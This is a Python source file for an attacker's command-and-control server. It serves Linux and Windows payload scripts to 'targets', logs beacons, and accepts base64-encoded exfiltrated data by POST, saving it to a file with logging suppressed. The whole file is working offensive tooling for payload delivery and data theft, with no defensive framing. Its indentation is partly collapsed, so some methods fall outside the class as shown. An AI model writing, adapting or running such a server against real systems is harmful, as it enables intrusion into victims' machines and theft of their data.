from http.server import BaseHTTPRequestHandler, HTTPServer import urllib.parse import base64 

class Handler(BaseHTTPRequestHandler): def do_GET(self): # Serve the correct payload based on the request if self.path == '/payload.sh': self.send_response(200) self.send_header('Content-type', 'text/plain') self.end_headers() with open('payload.sh', 'rb') as file: self.wfile.write(file.read()) print("[+] Linux payload (payload.sh) served to target") 

   elif self.path == '/payload_windows.ps1': 
        self.send_response(200) 
        self.send_header('Content-type', 'text/plain') 
        self.end_headers() 
        with open('payload_windows.ps1', 'rb') as file: 
            self.wfile.write(file.read()) 
        print("[+] Windows payload (payload_windows.ps1) served to target") 
     
    else: 
        print(f"[+] Beacon received: {self.path}") 
        self.send_response(200) 
        self.end_headers() 
     
def do_POST(self): 
    content_length = int(self.headers["Content-Length"]) 
    post_data = self.rfile.read(content_length).decode() 
    parsed_data = urllib.parse.parse_qs(post_data) 
     
    if "data" in parsed_data: 
        print("[+] Received exfiltrated data") 
        try: 
            decoded_data = base64.b64decode(parsed_data["data"][0]).decode() 
            with open("exfil_data.txt", "w") as f: 
                f.write(decoded_data) 
            print("[+] Data saved to exfil_data.txt") 
        except: 
            print("[-] Error decoding data") 
         
    self.send_response(200) 
    self.end_headers() 
 
# Disable default logging 
def log_message(self, format, *args): 
    return 
  

server = HTTPServer(("0.0.0.0", 8080), Handler) print("[+] Server started on port 8080") server.serve_forever() 